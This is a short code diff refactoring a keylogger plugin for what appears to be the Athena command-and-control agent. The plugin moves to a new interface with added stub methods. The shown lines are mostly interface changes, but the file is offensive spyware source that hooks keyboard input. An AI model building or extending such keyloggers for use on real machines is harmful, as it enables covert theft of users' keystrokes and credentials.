@@ -3,18 +3,22 @@ using System.Runtime.InteropServices;
 using System.Text;
 using Athena.Commands;
 using Athena.Commands.Models;
+using Athena.Models.Comms.Tasks;
 using keylogger;
 
 namespace Plugins
 {
-    public class Keylogger : AthenaPlugin
+    public class Keylogger : IPlugin
     {
-        public override string Name => "keylogger";
+        public string Name => "keylogger";
+
+        public bool Interactive => false;
+
         private bool isRunning = false;
         public string task_id = String.Empty;
         public CancellationTokenSource cts = new CancellationTokenSource();
 
-        public override void Execute(Dictionary<string, string> args)
+        public void Start(Dictionary<string, string> args)
         {
 
             if (this.isRunning)
@@ -442,8 +446,20 @@ namespace Plugins
             return Native.CallNextHookEx(IntPtr.Zero, code, wParam, lParam);
         }
 
+        public void Interact(InteractiveMessage message)
+        {
+            throw new NotImplementedException();
+        }
 
+        public void Stop(string task_id)
+        {
+            throw new NotImplementedException();
+        }
 
+        public bool IsRunning()
+        {
+            throw new NotImplementedException();
+        }
     }
 }
 
